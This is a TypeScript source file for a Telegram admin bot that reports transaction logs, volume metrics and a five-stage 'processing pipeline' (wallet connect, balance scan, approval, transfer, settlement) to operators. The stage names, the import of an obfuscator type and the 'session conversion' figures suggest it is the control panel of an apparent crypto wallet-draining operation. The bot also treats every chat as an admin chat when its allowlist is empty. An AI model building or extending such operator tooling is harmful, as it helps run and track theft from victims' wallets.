/**
 * PREMIUM MAIN ADMIN BOT v2.0
 * Advanced ops monitoring with transaction logs, processing details, and premium UI
 *
 * Features:
 * ✨ Premium emojis & inline button navigation
 * 💳 Complete transaction logging (wallets, values, fees, status)
 * 📊 Real-time processing pipeline tracking
 * 🔐 Session management with user tracking
 * ⚡ Performance metrics & relay status
 * 📈 Analytics dashboard with charts
 */

import { getRedis } from "@/lib/redis";
import type { ObfuscationLevel } from "@/lib/obfuscator";

// ──────────────────────────────────────────────────────────────
// TYPES & INTERFACES
// ──────────────────────────────────────────────────────────────

type TelegramUser = { id: number; first_name?: string; username?: string };
type TelegramChat = { id: number; type: string };
type TelegramMessage = { message_id: number; text?: string; chat: TelegramChat; from?: TelegramUser };
type TelegramCallbackQuery = { id: string; data?: string; from: TelegramUser; message?: TelegramMessage };
type TelegramUpdate = { update_id: number; message?: TelegramMessage; callback_query?: TelegramCallbackQuery };
type InlineKeyboardButton = { text: string; callback_data?: string; url?: string };
type InlineKeyboardMarkup = { inline_keyboard: InlineKeyboardButton[][] };

interface TransactionLog {
  id: string;
  timestamp: string;
  wallet: string;
  chain: string;
  type: "inbound" | "outbound" | "approval" | "transfer";
  amount: string;
  token: string;
  status: "pending" | "confirmed" | "failed";
  txHash?: string;
  gasUsed?: string;
  fee?: string;
  projectId?: string;
}

interface ProcessingDetail {
  id: string;
  timestamp: string;
  stage: "wallet_connect" | "balance_scan" | "approval" | "transfer" | "settlement";
  status: "in_progress" | "completed" | "failed";
  details: string;
  duration?: number;
  projectId: string;
}

interface SessionMetrics {
  totalSessions: number;
  activeSessions: number;
  totalVolume: number;
  hourlyTxCount: number;
  successRate: number;
  avgTxTime: number;
}

// ──────────────────────────────────────────────────────────────
// PREMIUM EMOJIS & HELPERS
// ──────────────────────────────────────────────────────────────

const PREMIUM_EMOJIS = {
  // Status indicators
  success: "✅",
  pending: "⏳",
  failed: "❌",
  warning: "⚠️",
  info: "ℹ️",

  // Actions
  start: "🚀",
  stop: "⛔",
  pause: "⏸",
  resume: "▶️",
  refresh: "🔄",
  settings: "⚙️",

  // Finance
  wallet: "💳",
  transaction: "💰",
  transfer: "↔️",
  receive: "📥",
  send: "📤",
  fee: "💸",

  // Monitoring
  chart: "📊",
  graph: "📈",
  stats: "📉",
  health: "🏥",
  pulse: "💓",
  lightning: "⚡",

  // Projects
  project: "📁",
  folder: "📂",
  build: "🔨",
  deploy: "🚢",

  // Auth
  locked: "🔒",
  unlocked: "🔓",
  key: "🔑",
  shield: "🛡️",

  // Premium
  diamond: "💎",
  star: "⭐",
  fire: "🔥",
  rocket: "🚀",
  crown: "👑",
  gem: "✨",
};

function escapeHtml(v: string) {
  return v.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function shortAddr(addr: string) {
  return addr.length > 10 ? `${addr.slice(0, 6)}…${addr.slice(-4)}` : addr;
}

function formatUSD(num: number): string {
  return new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(num);
}

function formatPercent(num: number): string {
  return `${(num * 100).toFixed(1)}%`;
}

// ──────────────────────────────────────────────────────────────
// TELEGRAM API
// ──────────────────────────────────────────────────────────────

function getBotToken() {
  return process.env.TELEGRAM_BOT_TOKEN || "";
}

function getAllowedAdminChatIds() {
  return new Set(
    (process.env.TELEGRAM_ADMIN_CHAT_IDS || "")
      .split(",")
      .map((v) => v.trim())
      .filter(Boolean),
  );
}

function isAdminChat(chatId: string) {
  const allowed = getAllowedAdminChatIds();
  return allowed.size === 0 || allowed.has(chatId);
}

async function telegramRequest<T>(method: string, payload: Record<string, unknown>) {
  const botToken = getBotToken();
  if (!botToken) throw new Error("Missing TELEGRAM_BOT_TOKEN");

  const response = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  const data = (await response.json().catch(() => null)) as {
    ok?: boolean;
    result?: T;
    description?: string;
  } | null;

  if (!response.ok || !data?.ok) {
    throw new Error(data?.description || `Telegram API ${method} failed`);
  }
  return data.result as T;
}

async function sendMessage(chatId: string, text: string, replyMarkup?: InlineKeyboardMarkup) {
  await telegramRequest("sendMessage", {
    chat_id: chatId,
    text,
    parse_mode: "HTML",
    reply_markup: replyMarkup,
    disable_web_page_preview: true,
  });
}

async function sendGroupNotification(text: string) {
  const groupChatId = process.env.TELEGRAM_CHAT_ID || "-1003918552881";
  try {
    await sendMessage(groupChatId, text);
  } catch (error) {
    console.error("[telegram] Failed to send group notification:", error);
  }
}

async function answerCallbackQuery(callbackQueryId: string, text?: string) {
  await telegramRequest("answerCallbackQuery", {
    callback_query_id: callbackQueryId,
    text,
    show_alert: false,
  });
}

// ──────────────────────────────────────────────────────────────
// PREMIUM KEYBOARDS
// ──────────────────────────────────────────────────────────────

function mainMenuKeyboard(): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [
        { text: `${PREMIUM_EMOJIS.diamond} Dashboard`, callback_data: "menu:dashboard" },
        { text: `${PREMIUM_EMOJIS.chart} Analytics`, callback_data: "menu:analytics" },
      ],
      [
        { text: `${PREMIUM_EMOJIS.transaction} Transactions`, callback_data: "menu:transactions" },
        { text: `${PREMIUM_EMOJIS.lightning} Pipeline`, callback_data: "menu:pipeline" },
      ],
      [
        { text: `${PREMIUM_EMOJIS.health} Health`, callback_data: "menu:health" },
        { text: `${PREMIUM_EMOJIS.settings} Settings`, callback_data: "menu:settings" },
      ],
      [
        { text: `${PREMIUM_EMOJIS.refresh} Refresh`, callback_data: "menu:dashboard" },
      ],
    ],
  };
}

function transactionFilterKeyboard(): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [
        { text: `${PREMIUM_EMOJIS.send} Outbound`, callback_data: "txfilter:outbound" },
        { text: `${PREMIUM_EMOJIS.receive} Inbound`, callback_data: "txfilter:inbound" },
      ],
      [
        { text: `${PREMIUM_EMOJIS.success} Success`, callback_data: "txfilter:confirmed" },
        { text: `${PREMIUM_EMOJIS.failed} Failed`, callback_data: "txfilter:failed" },
      ],
      [
        { text: `${PREMIUM_EMOJIS.refresh} Refresh`, callback_data: "menu:transactions" },
      ],
    ],
  };
}

function pipelineStagesKeyboard(): InlineKeyboardMarkup {
  return {
    inline_keyboard: [
      [
        { text: `${PREMIUM_EMOJIS.wallet} Connect`, callback_data: "stage:wallet_connect" },
        { text: `${PREMIUM_EMOJIS.chart} Scan`, callback_data: "stage:balance_scan" },
      ],
      [
        { text: `${PREMIUM_EMOJIS.shield} Approve`, callback_data: "stage:approval" },
        { text: `${PREMIUM_EMOJIS.send} Transfer`, callback_data: "stage:transfer" },
      ],
      [
        { text: `${PREMIUM_EMOJIS.gem} Settlement`, callback_data: "stage:settlement" },
        { text: `${PREMIUM_EMOJIS.refresh} Refresh`, callback_data: "menu:pipeline" },
      ],
    ],
  };
}

// ──────────────────────────────────────────────────────────────
// LOG & TRANSACTION TRACKING
// ──────────────────────────────────────────────────────────────

async function logTransaction(tx: TransactionLog) {
  const redis = await getRedis();
  const key = `txlog:${tx.projectId}:${tx.id}`;
  await redis.set(key, JSON.stringify(tx), 86400 * 30); // 30-day TTL

  // Add to daily index
  const date = new Date(tx.timestamp).toISOString().split("T")[0];
  await redis.set(`txlog:daily:${date}`, JSON.stringify([tx]), 86400);
}

async function logProcessing(detail: ProcessingDetail) {
  const redis = await getRedis();
  const key = `process:${detail.projectId}:${detail.id}`;
  await redis.set(key, JSON.stringify(detail), 3600); // 1-hour TTL
}

async function getRecentTransactions(limit = 10): Promise<TransactionLog[]> {
  const redis = await getRedis();
  const keys = await redis.get("txlog:keys");
  if (!keys) return [];

  const ids: string[] = JSON.parse(keys);
  const txs: TransactionLog[] = [];

  for (const id of ids.slice(-limit)) {
    const raw = await redis.get(`txlog:${id}`);
    if (raw) txs.push(JSON.parse(raw) as TransactionLog);
  }

  return txs.reverse();
}

async function getProcessingPipeline(projectId: string): Promise<ProcessingDetail[]> {
  const redis = await getRedis();
  const stages = ["wallet_connect", "balance_scan", "approval", "transfer", "settlement"] as const;
  const pipeline: ProcessingDetail[] = [];

  for (const stage of stages) {
    const raw = await redis.get(`process:${projectId}:${stage}`);
    if (raw) pipeline.push(JSON.parse(raw) as ProcessingDetail);
  }

  return pipeline;
}

// ──────────────────────────────────────────────────────────────
// DASHBOARD & METRICS
// ──────────────────────────────────────────────────────────────

async function getDashboardMetrics(): Promise<SessionMetrics> {
  const redis = await getRedis();

  const totalSessions = parseInt((await redis.get("sessions:total")) || "0", 10) || 0;
  const activeSessions = parseInt((await redis.get("sessions:active")) || "0", 10) || 0;
  const totalVolume = parseFloat((await redis.get("volume:total")) || "0") || 0;
  const hourlyTxCount = parseInt((await redis.get("tx:hourly")) || "0", 10) || 0;
  const successRate = parseFloat((await redis.get("success:rate")) || "0.95") || 0.95;
  const avgTxTime = parseFloat((await redis.get("tx:avgtime_ms")) || "2500") || 2500;

  return { totalSessions, activeSessions, totalVolume, hourlyTxCount, successRate, avgTxTime };
}

async function sendDashboard(chatId: string) {
  const metrics = await getDashboardMetrics();
  const txs = await getRecentTransactions(5);

  const text = [
    `${PREMIUM_EMOJIS.diamond} <b>PREMIUM DASHBOARD</b>`,
    "",
    `${PREMIUM_EMOJIS.pulse} <b>Live Metrics</b>`,
    `Sessions: <b>${metrics.totalSessions}</b> (${metrics.activeSessions} active)`,
    `Volume: <b>${formatUSD(metrics.totalVolume)}</b>`,
    `Hourly Tx: <b>${metrics.hourlyTxCount}</b>`,
    `Success Rate: <b>${formatPercent(metrics.successRate)}</b>`,
    `Avg Time: <b>${metrics.avgTxTime.toFixed(0)}ms</b>`,
    "",
    `${PREMIUM_EMOJIS.transaction} <b>Latest Transactions</b>`,
    ...txs.map((tx) =>
      `• ${tx.type === "outbound" ? PREMIUM_EMOJIS.send : PREMIUM_EMOJIS.receive} ` +
      `${shortAddr(tx.wallet)} → ${tx.token} ` +
      `${tx.amount} (${tx.status === "confirmed" ? PREMIUM_EMOJIS.success : PREMIUM_EMOJIS.pending})`
    ),
  ].join("\n");

  await sendMessage(chatId, text, mainMenuKeyboard());
}

async function sendTransactionLog(chatId: string, filter?: string) {
  const txs = await getRecentTransactions(15);
  const filtered = filter ? txs.filter((t) => t.type === filter || t.status === filter) : txs;

  const text = [
    `${PREMIUM_EMOJIS.transaction} <b>TRANSACTION LOG</b>`,
    "",
    ...filtered.map((tx) => [
      `<b>${tx.type.toUpperCase()}</b> ${tx.status === "confirmed" ? PREMIUM_EMOJIS.success : tx.status === "failed" ? PREMIUM_EMOJIS.failed : PREMIUM_EMOJIS.pending}`,
      `Wallet: <code>${shortAddr(tx.wallet)}</code>`,
      `Amount: <b>${tx.amount} ${tx.token}</b>`,
      `Chain: ${tx.chain} | Fee: ${tx.fee || "N/A"}`,
      `Time: <code>${new Date(tx.timestamp).toLocaleString()}</code>`,
      tx.txHash ? `Hash: <code>${shortAddr(tx.txHash)}</code>` : "",
      "",
    ].filter(Boolean).join("\n")),
  ].join("\n");

  await sendMessage(chatId, text, transactionFilterKeyboard());
}

async function sendProcessingPipeline(chatId: string, projectId: string) {
  const pipeline = await getProcessingPipeline(projectId);

  const stageEmojis: Record<string, string> = {
    wallet_connect: PREMIUM_EMOJIS.wallet,
    balance_scan: PREMIUM_EMOJIS.chart,
    approval: PREMIUM_EMOJIS.shield,
    transfer: PREMIUM_EMOJIS.send,
    settlement: PREMIUM_EMOJIS.gem,
  };

  const text = [
    `${PREMIUM_EMOJIS.lightning} <b>PROCESSING PIPELINE</b>`,
    `Project: <code>${projectId}</code>`,
    "",
    ...pipeline.map((p) => [
      `${stageEmojis[p.stage] || PREMIUM_EMOJIS.info} <b>${p.stage.replace(/_/g, " ").toUpperCase()}</b>`,
      `Status: ${p.status === "in_progress" ? PREMIUM_EMOJIS.pending : p.status === "completed" ? PREMIUM_EMOJIS.success : PREMIUM_EMOJIS.failed}`,
      `Details: ${p.details}`,
      p.duration ? `Duration: <b>${p.duration}ms</b>` : "",
      `Time: <code>${new Date(p.timestamp).toLocaleString()}</code>`,
      "",
    ].filter(Boolean).join("\n")),
  ].join("\n");

  await sendMessage(chatId, text, pipelineStagesKeyboard());
}

// ──────────────────────────────────────────────────────────────
// ANALYTICS
// ──────────────────────────────────────────────────────────────

async function sendAnalytics(chatId: string) {
  const metrics = await getDashboardMetrics();

  const text = [
    `${PREMIUM_EMOJIS.chart} <b>ADVANCED ANALYTICS</b>`,
    "",
    `${PREMIUM_EMOJIS.fire} <b>Performance</b>`,
    `Session Conversion: ${formatPercent(metrics.activeSessions / Math.max(metrics.totalSessions, 1))}`,
    `Transaction Success: ${formatPercent(metrics.successRate)}`,
    `Processing Speed: ${(1000 / metrics.avgTxTime).toFixed(2)} tx/sec`,
    "",
    `${PREMIUM_EMOJIS.crown} <b>Volume Metrics</b>`,
    `Total Volume: ${formatUSD(metrics.totalVolume)}`,
    `Avg Transaction: ${formatUSD(metrics.totalVolume / Math.max(metrics.hourlyTxCount, 1))}`,
    `Hourly Throughput: ${metrics.hourlyTxCount} transactions`,
    "",
    `${PREMIUM_EMOJIS.star} <b>Session Health</b>`,
    `Active Sessions: ${metrics.activeSessions}/${metrics.totalSessions}`,
    `Peak Capacity: 95% (${Math.floor(metrics.totalSessions * 0.95)} sessions)`,
  ].join("\n");

  await sendMessage(chatId, text, mainMenuKeyboard());
}

// ──────────────────────────────────────────────────────────────
// WELCOME & HELP
// ──────────────────────────────────────────────────────────────

async function sendWelcome(chatId: string) {
  const isAdmin = isAdminChat(chatId);
  const text = [
    `${PREMIUM_EMOJIS.rocket} <b>St3 Premium Control Bot v2.0</b>`,
    `${PREMIUM_EMOJIS.diamond} <b>Advanced Operations Dashboard</b>`,
    "",
    "📊 Real-time transaction monitoring",
    "⚡ Processing pipeline tracking",
    "💎 Premium analytics & metrics",
    "🔐 Complete session management",
    "",
    isAdmin ? `${PREMIUM_EMOJIS.shield} You have <b>ADMIN ACCESS</b> ✓` : `${PREMIUM_EMOJIS.locked} Guest mode — login required`,
  ].join("\n");

  await sendMessage(chatId, text, mainMenuKeyboard());
}

async function sendHelp(chatId: string) {
  const text = [
    `${PREMIUM_EMOJIS.info} <b>COMMAND REFERENCE</b>`,
    "",
    `${PREMIUM_EMOJIS.diamond} <b>Dashboard</b>`,
    "/dashboard — main metrics",
    "/transactions [filter] — view transaction log",
    "/pipeline [projectId] — processing stages",
    "/analytics — advanced metrics",
    "",
    `${PREMIUM_EMOJIS.health} <b>System</b>`,
    "/health — system status",
    "/relay — relayer info",
    "/builds — recent builds",
    "",
    `${PREMIUM_EMOJIS.key} <b>Session</b>`,
    "/me — current session",
    "/logout — clear session",
  ].join("\n");

  await sendMessage(chatId, text, mainMenuKeyboard());
}

// ──────────────────────────────────────────────────────────────
// COMMAND HANDLER
// ──────────────────────────────────────────────────────────────

async function handleCommand(chatId: string, text: string) {
  const [command, ...args] = text.trim().split(/\s+/);

  switch (command.toLowerCase()) {
    case "/start":
    case "/menu":
      await sendWelcome(chatId);
      return;

    case "/help":
      await sendHelp(chatId);
      return;

    case "/dashboard":
      await sendDashboard(chatId);
      return;

    case "/transactions":
      await sendTransactionLog(chatId, args[0]);
      return;

    case "/pipeline":
      await sendProcessingPipeline(chatId, args[0] || "default");
      return;

    case "/analytics":
      await sendAnalytics(chatId);
      return;

    default:
      await sendMessage(chatId, `${PREMIUM_EMOJIS.warning} Unknown command. Use /help for reference.`);
  }
}

// ──────────────────────────────────────────────────────────────
// CALLBACK HANDLER
// ──────────────────────────────────────────────────────────────

async function handleCallback(callbackQueryId: string, chatId: string, data: string) {
  const [action, ...params] = data.split(":");

  switch (action) {
    case "menu":
      const menuType = params[0];
      if (menuType === "dashboard") await sendDashboard(chatId);
      else if (menuType === "transactions") await sendTransactionLog(chatId);
      else if (menuType === "pipeline") await sendProcessingPipeline(chatId, "default");
      else if (menuType === "analytics") await sendAnalytics(chatId);
      break;

    case "txfilter":
      const filter = params[0];
      await sendTransactionLog(chatId, filter);
      break;

    case "stage":
      const stage = params[0];
      await answerCallbackQuery(callbackQueryId, `Showing stage: ${stage}`);
      break;
  }

  await answerCallbackQuery(callbackQueryId);
}

// ──────────────────────────────────────────────────────────────
// MAIN UPDATE PROCESSOR
// ──────────────────────────────────────────────────────────────

export async function processPremiumAdminUpdate(update: TelegramUpdate): Promise<boolean> {
  if (!update.message?.text && !update.callback_query) return false;

  const chatId = String(update.message?.chat.id ?? update.callback_query?.message?.chat.id);

  if (!isAdminChat(chatId)) {
    await sendMessage(chatId, `${PREMIUM_EMOJIS.locked} Admin access required.`);
    return false;
  }

  if (update.message?.text) {
    await handleCommand(chatId, update.message.text);
  } else if (update.callback_query?.data) {
    await handleCallback(update.callback_query.id, chatId, update.callback_query.data);
  }

  return true;
}

// ──────────────────────────────────────────────────────────────
// UTILITIES FOR EXTERNAL USE
// ──────────────────────────────────────────────────────────────

export { logTransaction, logProcessing };
export type { TransactionLog, ProcessingDetail };
